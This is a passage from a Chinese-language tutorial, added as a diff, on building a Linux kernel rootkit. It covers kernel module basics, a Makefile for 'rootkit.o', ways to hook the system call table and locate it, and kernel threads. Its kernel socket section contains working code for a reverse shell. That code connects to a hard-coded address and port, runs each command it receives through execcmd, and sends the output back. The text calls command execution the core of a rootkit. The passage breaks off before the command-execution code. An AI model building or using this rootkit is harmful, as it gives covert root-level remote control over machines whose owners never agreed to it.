@@ -1,0 +1,249 @@
+
+```c
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("windy_ll");
+MODULE_DESCRIPTION("Basic Kernel Module");
+MODULE_VERSION("0.01");
+
+static int __init example_init(void)
+{
+    printk(KERN_INFO "Hello, world!\n");
+    return 0;
+}
+
+static void __exit example_exit(void)
+{
+    printk(KERN_INFO "Goodbye, world!\n");
+}
+
+module_init(example_init);
+module_exit(example_exit);
+```
+
+**5、linux kernel module可通过`make modules`命令编译，例如本篇编译的`Makefile`文件如下所示：**
+
+```makefile
+obj-m += rootkit.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+**5、linux kernel module使用命令`insmod`加载，使用`rmmod`命令卸载，可以使用`lsmod`命令查看所有已经加载的linux kernel module。上面的linux kernel module运行结果如下图所示：**
+
+![](https://bbs.kanxue.com/upload/attach/202208/851220_JABY266M85UTVWB.jpg)
+
+![](https://bbs.kanxue.com/upload/attach/202208/851220_RWH32JPHZDKG5YM.jpg)
+
+![](https://bbs.kanxue.com/upload/attach/202208/851220_X5NM7J4RZ759NCM.jpg)
+
+---
+
+# 四、hook系统调用表
+
+### 1、系统调用表（System call Table），是一张由指向实现各种系统调用的内核函数的函数指针组成的表，该表可以基于系统调用编号进行索引，来定位函数地址，完成系统调用(PS: 来自百度百科)，系统调用表详细列表如下链接所示：
+
+[9cbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1L8%4u0$3j5h3I4V1M7#2)9J5c8X3I4A6L8Y4g2^5i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3q4J5j5$3S2Q4x3V1k6^5z5o6k6Q4x3V1k6W2L8Y4c8J5P5g2)9J5c8Y4y4&6M7$3y4S2L8r3I4K6i4K6u0r3M7%4W2K6j5$3q4D9L8q4)9#2k6U0j5@1i4K6u0W2N6r3u0D9](https://bbs.kanxue.com/elink@b4eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1L8%4u0$3j5h3I4V1M7#2)9J5c8X3I4A6L8Y4g2^5i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3q4J5j5$3S2Q4x3V1k6^5z5o6k6Q4x3V1k6W2L8Y4c8J5P5g2)9J5c8Y4y4&6M7$3y4S2L8r3I4K6i4K6u0r3M7%4W2K6j5$3q4D9L8q4)9#2k6U0j5@1i4K6u0W2N6r3u0D9)
+
+### 2、系统调用表的hook一般可以通过以下几种方式来实现：
+
+- 找到系统调用表位置，修改系统调用表中的函数地址
+
+- 找到系统调用表位置，修改系统调用表函数前几个字节做一个`jmp`，就是`inlinehook`，当然可以在汇编上直接替换掉系统调用表的函数二进制指令
+
+- 利用别人写好的框架，例如`ftrace`(PS:本文为了方便，即利用此方式)
+
+### 3、获取系统调用表地址一般也可以通过以下几种方式来实现
+
+- 通过调用函数`kallsyms_lookup_name`获取(ps:高版本已经被禁用该函数)
+
+- 扫描内存，匹配特征码来找到系统调用表的地址
+
+- 读取`/proc/kallsym`文件来获取
+
+- 其他方法，不在过多介绍
+
+### 4、linux kernel rootkit中的某些功能需要通过hook系统调用表的函数来实现，例如监控命令的执行等
+
+---
+
+# 五、linux kernel多线程
+
+### 1、linux kernel中的多线程可使用宏定义`kthread_run`来创建一个内核线程，第一个参数为线程要执行的函数名，使用`kthread_stop`来停止
+
+### 2、一个简单的多线程示例如下所示：(PS: 这里不用导入那么多头文件，之所以使用这么多头文件，是使用了其他API)
+
+```c
+#include <linux/module.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/version.h>
+#include <linux/namei.h>
+#include <linux/moduleparam.h>
+#include <linux/sched.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+
+static struct task_struct *test_kthread = NULL;
+
+static int kthread_test_func(void *data)
+{
+    return 0;
+}
+
+static __init int kthread_test_init(void)
+{
+    test_kthread = kthread_run(kthread_test_func, NULL, "kthread-test");
+    if (!test_kthread) {
+        return -ECHILD;
+    }
+
+    return 0;
+}
+
+static __exit void kthread_test_exit(void)
+{
+}
+
+module_init(kthread_test_init);
+module_exit(kthread_test_exit);
+```
+
+---
+
+# 六、linux kernel socket
+
+### 1、linux内核中的通信和用户层面的步骤差不多，都是先创建socket、连接或监听socket、调用函数收发信息、关闭连接
+
+### 2、不同点在于调用的API不同，linux内核中调用的是`sock_create_kern`函数来创建socket，调用`sock->ops->connect`来连接服务端(PS:这里的sock是前面创建的socket连接符)，调用`kernel_sendmsg`来发送信息，调用`kernel_recvmsg`来接收信息，调用`kernel_sock_shutdown`函数来关闭连接，调用`sock_release`函数来释放socket连接符，按照用户层的socket的流程来调用即可
+
+### 3、上面的api不是唯一的，linux源码中还提供了其他的函数来实现socket连接，感兴趣的可以去查阅相关的linux源码
+
+### 4、上面只写了socket客户端，不写socket服务端的原因是作者测试了好几套api在5.4的内核版本中，都运行到某个阶段内核就挂了，知道原因的大佬可以指出是什么原因
+
+### 5、测试用例如下所示：
+
+```c
+static int myserver(void *data){
+    struct socket *sock,*client_sock;
+    struct sockaddr_in s_addr;
+    unsigned short portnum=8888;
+    int ret=0;
+    char recvbuf[1024];
+    char sendbuf[4096];
+    char *result;
+    struct msghdr recvmsg,sendmsg;
+    struct kvec send_vec,recv_vec;
+
+    //sendbuf = kmalloc(1024,GFP_KERNEL);
+    if(sendbuf == NULL) {
+        printk(KERN_INFO "[SockTest]: sendbuf kmalloc failed!\n");
+        return -1;
+    }
+
+    //recvbuf = kmalloc(1024,GFP_KERNEL);
+    if(recvbuf == NULL) {
+        printk(KERN_INFO "[SockTest]: recvbuf kmalloc failed!\n");
+        return -1;
+    }
+
+    memset(&s_addr,0,sizeof(s_addr));
+    s_addr.sin_family=AF_INET;
+    s_addr.sin_port=htons(portnum);
+    s_addr.sin_addr.s_addr=in_aton("10.10.10.195");
+
+    sock=(struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
+    client_sock=(struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
+
+    /*create a socket*/
+    ret=sock_create_kern(&init_net,AF_INET, SOCK_STREAM,0,&sock);
+    if(ret < 0){
+        printk("[SockTest]:socket_create_kern error!\n");
+        return -1;
+    }
+    printk("[SockTest]:socket_create_kern ok!\n");
+
+    /*connect the socket*/
+    ret=sock->ops->connect(sock,(struct sockaddr *)&s_addr,sizeof(s_addr),0);
+    printk(KERN_INFO "[SockTest]: connect ret = %d\n",ret);
+    /*
+    if(ret != 0){
+        printk("[SockTest]: connect error\n");
+        return ret;
+    }
+    */
+    printk("[SockTest]:connect ok!\n");
+
+    memset(sendbuf,0,1024);
+
+    strcpy(sendbuf,"test");
+
+    memset(&sendmsg,0,sizeof(sendmsg));
+    memset(&send_vec,0,sizeof(send_vec));
+
+    send_vec.iov_base = sendbuf;
+    send_vec.iov_len = 4096;
+
+    /*send*/
+    ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,4);
+    printk(KERN_INFO "[SockTest]: kernel_sendmsg ret = %d\n",ret);
+    if(ret < 0) {
+        printk(KERN_INFO "[SockTest]: kernel_sendmsg failed!\n");
+        return ret;
+    }
+    printk(KERN_INFO "[SockTest]: send ok!\n");
+    memset(&recv_vec,0,sizeof(recv_vec));
+    memset(&recvmsg,0,sizeof(recvmsg));
+
+    recv_vec.iov_base = recvbuf;
+    recv_vec.iov_len = 1024;
+
+    /*kmalloc a receive buffer*/
+    while(true) {
+        memset(recvbuf, 0, 1024);
+
+        ret = kernel_recvmsg(sock,&recvmsg,&recv_vec,1,1024,0);
+        printk(KERN_INFO "[SockTest]: received message: %s\n",recvbuf);
+        if(!strcmp("exit",recvbuf)) {
+            break;
+        }
+        printk(KERN_INFO "[SockTest]: %ld\n",strlen(recvbuf));
+        result = execcmd(recvbuf);
+        memset(sendbuf,0,4096);
+        strncpy(sendbuf,result,4096);
+        ret = kernel_sendmsg(sock,&sendmsg,&send_vec,1,strlen(sendbuf));
+    }
+
+    kernel_sock_shutdown(sock,SHUT_RDWR);
+    sock_release(sock);
+    printk(KERN_INFO "[SockTest]: socket exit\n");
+
+    return 0;
+}
+```
+
+---
+
+# 七、linux kernel命令执行
+
+### 1、对于一个rootkit来说，最核心的功能点肯定在于能够执行命令
+
+### 2、在linux内核中，有以下几种方式可以用来执行命令：
+
+- hook系统调用表，劫持命令执行函数`sys_execve`
+
+- 调用`call_usermodehelper`函数直接执行命令
+
+### 3、这里使用的是第二种方式来执行命令，第一种只做到了无参数命令执行，对于有参数的解析其参数时按照指针数组解析出来的不知道为啥一直是乱码，知道原因的大佬可以指教以下
+
+### 4、无论是什么方式，都无法将命令回显结果直接写入内存直接读取，所以这里采用的是将命令结果利用`>`写入某个文件中，然后调用`vfs_read`函数读取文件获取命令回显，如下所示：
